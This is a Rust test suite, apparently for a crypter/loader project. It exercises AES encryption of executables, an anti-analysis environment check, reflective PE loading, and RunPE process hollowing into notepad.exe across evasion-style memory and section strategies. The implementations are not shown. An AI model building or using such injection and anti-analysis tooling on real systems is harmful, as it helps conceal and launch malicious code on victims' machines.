
#[cfg(test)]
mod unit_tests {
    use super::super::protection::key_generator;
    use super::super::protection::anti_analysis;
    use super::super::protection::file_loader;
    
    #[test]
    fn test_key_generation() {
        let key = key_generator::generate_aes256_key().unwrap();
        assert_eq!(key.len(), 32);
        
        let iv = key_generator::generate_aes_iv().unwrap();
        assert_eq!(iv.len(), 16);
        
        let key2 = key_generator::generate_aes256_key().unwrap();
        assert_ne!(key, key2);
    }
    
    #[test]
    fn test_environment_analysis() {
        let result = anti_analysis::analyze_environment();
        println!("Analysis result: {:?}", result);
    }
    
    #[test]
    fn test_protected_file_wipe() {
        let content = vec![1, 2, 3, 4, 5];
        let mut file = file_loader::ProtectedFile {
            content: content.clone(),
            metadata: None,
        };
        
        assert_eq!(file.content(), &content);
        
        file.secure_wipe();
        assert_eq!(file.content(), &vec![0, 0, 0, 0, 0]);
    }
}

#[cfg(test)]
mod integration_tests {
    use std::fs;
    use std::io::Write;
    use tempfile::NamedTempFile;
    use super::super::protection::key_generator;
    use super::super::protection::file_loader;
    use super::super::gpu_packer;
    
    #[test]
    #[cfg(feature = "encryption")]
    fn test_file_encryption_decryption() {
        let mut temp_file = NamedTempFile::new().unwrap();
        let test_content = b"This is a test file for encryption and decryption";
        temp_file.write_all(test_content).unwrap();
        
        let key = key_generator::generate_aes256_key().unwrap();
        let iv = key_generator::generate_aes_iv().unwrap();
        
        let encrypted_file = NamedTempFile::new().unwrap();
        
        file_loader::encrypt_file(
            temp_file.path(),
            encrypted_file.path(),
            &key,
            &iv,
        ).unwrap();
        
        let protected_file = file_loader::load_encrypted_file(
            encrypted_file.path(),
            &key,
            &iv,
        ).unwrap();
        
        assert_eq!(protected_file.content(), test_content);
    }
    
    #[test]
    fn test_gpu_packer_cpu_fallback() {
        let mut temp_file = NamedTempFile::new().unwrap();
        let test_content = b"This is a test file for GPU packing";
        temp_file.write_all(test_content).unwrap();
        
        let output_file = NamedTempFile::new().unwrap();
        let config = gpu_packer::PackerConfig::default();
        
        gpu_packer::pack_file_cpu(
            temp_file.path(),
            output_file.path(),
            &config,
        ).unwrap();
        
        let unpacked_file = NamedTempFile::new().unwrap();
        gpu_packer::unpack_file(
            output_file.path(),
            unpacked_file.path(),
        ).unwrap();
        
        let unpacked_content = fs::read(unpacked_file.path()).unwrap();
        assert_eq!(unpacked_content, test_content);
    }
}

#[cfg(all(test, target_os = "windows"))]
mod windows_tests {
    use std::fs;
    use std::io::Write;
    use tempfile::NamedTempFile;
    use super::super::runpe;
    use super::super::reflective_loader::{self, LoaderConfig, MemoryAllocationStrategy, SectionMappingStrategy};
    
    #[test]
    fn test_reflective_loading() {
        let test_exe_path = "test_files/hello_world.exe";
        
        if !std::path::Path::new(test_exe_path).exists() {
            println!("Test executable not found, skipping test");
            return;
        }
        
        let pe_data = fs::read(test_exe_path).unwrap();
        
        let result = super::super::reflective_loader::load_pe(&pe_data);
        assert!(result.is_ok());
    }
    
    #[test]
    fn test_reflective_loading_with_strategies() {
        let test_exe_path = "test_files/hello_world.exe";
        
        if !std::path::Path::new(test_exe_path).exists() {
            println!("Test executable not found, skipping test");
            return;
        }
        
        let pe_data = fs::read(test_exe_path).unwrap();
        
        let memory_strategies = [
            MemoryAllocationStrategy::Standard,
            MemoryAllocationStrategy::NonContiguous,
            MemoryAllocationStrategy::RandomPadding,
            MemoryAllocationStrategy::ReverseOrder,
            MemoryAllocationStrategy::HollowedRegion,
        ];
        
        let section_strategies = [
            SectionMappingStrategy::Standard,
            SectionMappingStrategy::RandomOrder,
            SectionMappingStrategy::Fragmented,
            SectionMappingStrategy::CustomProtection,
            SectionMappingStrategy::DelayedProtection,
        ];
        
        for &memory_strategy in &memory_strategies {
            for &section_strategy in &section_strategies {
                let config = LoaderConfig {
                    memory_strategy,
                    section_strategy,
                };
                
                let result = reflective_loader::load_pe_with_config(&pe_data, &config);
                println!("Testing with memory_strategy={:?}, section_strategy={:?}: {:?}", 
                         memory_strategy, section_strategy, result);
                
                if memory_strategy == MemoryAllocationStrategy::Standard && 
                   section_strategy == SectionMappingStrategy::Standard {
                    assert!(result.is_ok(), "Standard strategies should always work");
                }
            }
        }
    }
    
    #[test]
    fn test_encrypted_reflective_loading() {
        let test_exe_path = "test_files/hello_world.exe";
        
        if !std::path::Path::new(test_exe_path).exists() {
            println!("Test executable not found, skipping test");
            return;
        }
        
        let pe_data = fs::read(test_exe_path).unwrap();
        
        let key = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 
                   0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
                   0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
                   0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20];
        
        let iv = [0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
                  0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30];
        
        let encrypted_data = super::super::reflective_loader::encrypt_aes256_cbc(&pe_data, &key, &iv).unwrap();
        
        let config = LoaderConfig {
            memory_strategy: MemoryAllocationStrategy::NonContiguous,
            section_strategy: SectionMappingStrategy::RandomOrder,
        };
        
        let result = reflective_loader::load_encrypted_pe_with_config(&encrypted_data, &key, &iv, &config);
        assert!(result.is_ok());
    }
    
    #[test]
    fn test_runpe_injection() {
        let test_exe_path = "test_files/hello_world.exe";
        
        if !std::path::Path::new(test_exe_path).exists() {
            println!("Test executable not found, skipping test");
            return;
        }
        
        let pe_data = fs::read(test_exe_path).unwrap();
        
        let config = runpe::RunPeConfig {
            target_path: "C:\\Windows\\System32\\notepad.exe".to_string(),
            arguments: None,
            auto_resume: false, // Don't auto-resume for testing
            memory_strategy: runpe::MemoryAllocationStrategy::Standard,
            section_strategy: runpe::SectionMappingStrategy::Standard,
        };
        
        let result = runpe::inject_pe(&pe_data, &config);
        
        if cfg!(target_os = "windows") {
            assert!(result.is_ok());
            
            if let Ok(process_id) = result {
                unsafe {
                    windows_sys::Win32::System::Threading::TerminateProcess(
                        process_id as isize,
                        0,
                    );
                }
            }
        } else {
            assert!(matches!(result, Err(runpe::RunPeError::NotSupported)));
        }
    }
    
    #[test]
    fn test_runpe_injection_with_strategies() {
        let test_exe_path = "test_files/hello_world.exe";
        
        if !std::path::Path::new(test_exe_path).exists() {
            println!("Test executable not found, skipping test");
            return;
        }
        
        let pe_data = fs::read(test_exe_path).unwrap();
        
        let memory_strategies = [
            runpe::MemoryAllocationStrategy::Standard,
            runpe::MemoryAllocationStrategy::NonContiguous,
            runpe::MemoryAllocationStrategy::RandomPadding,
            runpe::MemoryAllocationStrategy::ReverseOrder,
            runpe::MemoryAllocationStrategy::HollowedRegion,
        ];
        
        let section_strategies = [
            runpe::SectionMappingStrategy::Standard,
            runpe::SectionMappingStrategy::RandomOrder,
            runpe::SectionMappingStrategy::Fragmented,
            runpe::SectionMappingStrategy::CustomProtection,
            runpe::SectionMappingStrategy::DelayedProtection,
        ];
        
        for &memory_strategy in &memory_strategies {
            for &section_strategy in &section_strategies {
                let config = runpe::RunPeConfig {
                    target_path: "C:\\Windows\\System32\\notepad.exe".to_string(),
                    arguments: None,
                    auto_resume: false,
                    memory_strategy,
                    section_strategy,
                };
                
                let result = runpe::inject_pe(&pe_data, &config);
                println!("Testing RUNPE with memory_strategy={:?}, section_strategy={:?}: {:?}", 
                         memory_strategy, section_strategy, result);
                
                if let Ok(process_id) = result {
                    unsafe {
                        windows_sys::Win32::System::Threading::TerminateProcess(
                            process_id as isize,
                            0,
                        );
                    }
                }
                
                if memory_strategy == runpe::MemoryAllocationStrategy::Standard && 
                   section_strategy == runpe::SectionMappingStrategy::Standard {
                    assert!(result.is_ok(), "Standard strategies should always work");
                }
            }
        }
    }
    
    #[test]
    fn test_error_handling() {
        let invalid_pe_data = vec![0, 1, 2, 3, 4, 5];
        
        let result = reflective_loader::load_pe(&invalid_pe_data);
        assert!(result.is_err());
        
        let test_exe_path = "test_files/hello_world.exe";
        if std::path::Path::new(test_exe_path).exists() {
            let pe_data = fs::read(test_exe_path).unwrap();
            
            let key = [0; 32]; // All zeros key
            let iv = [0; 16];  // All zeros IV
            
            let encrypted_data = super::super::reflective_loader::encrypt_aes256_cbc(&pe_data, &key, &iv).unwrap();
            
            let wrong_key = [1; 32];
            let result = reflective_loader::load_encrypted_pe(&encrypted_data, &wrong_key, &iv);
            assert!(result.is_err());
        }
    }
}
